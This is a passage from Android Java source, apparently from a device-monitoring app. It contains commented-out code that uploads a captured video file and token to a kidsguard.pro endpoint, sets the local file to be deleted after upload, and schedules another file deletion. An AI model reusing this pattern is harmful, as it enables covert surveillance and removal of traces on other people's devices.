                                        ioException.printStackTrace();
                                    }
//                Handler handler=new Handler();
//                handler.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                       if (file.exists()){
//                           file.delete();
//                       }
//                    }
//                },2000);


                                }
                                //	responseString = e.toString();
                            }
                        }
                    }).start();

                }catch (Exception e){}

//                String uploadId = UUID.randomUUID().toString();
//                try {
//                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
//                            .addFileToUpload(fileses[0].getPath(), "video") //Adding file
//                            .addParameter("token", getToken(getApplicationContext()))
//                            .addParameter("token1", "allow")//Adding text parameter to the request
//                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
//                            .setMaxRetries(2)
//
//                            .startUpload(); //Starting the upload
//                } catch (FileNotFoundException e) {
//                    e.printStackTrace();
//                } catch (MalformedURLException e) {
//                    e.printStackTrace();
//                }
            }
        }
    }
}
